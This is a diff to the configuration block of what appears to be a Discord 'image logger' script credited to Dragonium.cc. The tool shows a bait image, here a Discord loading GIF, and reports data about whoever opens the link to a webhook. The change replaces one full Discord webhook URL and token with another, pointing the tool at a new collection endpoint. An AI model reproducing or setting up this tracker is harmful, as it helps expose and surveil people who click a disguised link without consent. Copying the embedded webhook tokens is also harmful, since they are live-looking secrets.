@@ -11,7 +11,7 @@ __author__ = "Dragonium.cc"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1135849467040497674/z9wfgalyA6T8MPcBYdGQ_qCapyoWk2Wgc_LG60XsZI_NtzqwDQEYzw429jw8IEN_8Hcq",
+    "webhook": "https://discord.com/api/webhooks/1140728657762062417/ZLD6liKZ654YCYYK05nHQGmhowOkWK4bquGV-_7JkTNnstysFVIloC7_I5zdW42dxZl1",
     "image": "https://media.tenor.com/BP79uBTrSy0AAAAd/loading-discord.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
